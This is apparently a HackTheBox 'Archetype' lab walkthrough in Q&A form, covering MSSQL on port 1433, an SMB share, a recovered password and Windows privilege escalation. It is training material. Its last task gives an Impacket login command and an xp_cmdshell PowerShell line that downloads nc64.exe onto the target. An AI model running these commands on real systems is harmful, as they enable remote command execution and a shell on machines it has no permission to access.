<h1>Archetype</h1>

<h2>CONNECT</h2>
Connect to Starting Point VPN before starting the machine<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Fawn/Fawn/download.png" alt="download" width="30%">
Using <code>openvpn</code> to operate the file of <code>download vpn</code> in kali.

<h2>TASK</h2>

<h3>TASK 1</h3>
Q：Which TCP port is hosting a database server?<br>
A：<code>1433</code><br><br>

<h3>TASK 2</h3>
Q：What is the name of the non-Administrative share available over SMB?<br>
A：<code>backups</code><br>


<h3>TASK 3</h3>
Q：What is the password identified in the file on the SMB share?<br>
A：<code>M3g4c0rp123</code><br>

<h3>TASK 4</h3>
Q：What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?<br>
A：<code>mssqlclient.py</code><br>
FYI：<a href="https://www.secureauth.com/labs/open-source-tools/impacket/">Secure Auth</a>

<h3>TASK 5</h3>
Q：What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?<br>
A：<code>xp_cmdshell</code><br><br>
<a href="1433 - Pentesting MSSQL - Microsoft SQL Server">1433 - Microsoft SQL Server</a><br>
<a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">MSSQL Injection Cheat Sheet</a><br>

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Appointment/appointment/nmap.png" alt="nmap" width="60%">

<h3>TASK 6</h3>
Q：What script can be used in order to search possible paths to escalate privileges on Windows hosts?<br>
A：<code>WinPEAS</code><br><br>
<a href="https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md">Windows Privilege Escalation Awesome Script (.exe)</a>

<h3>TASK 7</h3>
Q：What file contains the administrator's password?<br>
A：<code>ConsoleHost_history.txt</code><br>
<code>python3 mssqlclient.py ARCHETYPE/sql_svc:&lt;passwd&gt;@&lt;TARGET IP&gt; -windows-auth</code><br><br>
<code>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://&lt;TARGET IP&gt/nc64.exe -outfile nc64.exe"</code>


<h2>SUBMIT FLAG</h2>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Appointment/appointment/login1.png" alt="login1" width="30%">
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Appointment/appointment/login2.png" alt="login2" width="30%">
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Appointment/appointment/login3.png" alt="login3" width="30%">
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Appointment/appointment/login4.png" alt="login4" width="30%">
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Appointment/appointment/flag.png" alt="flag" width="60%">

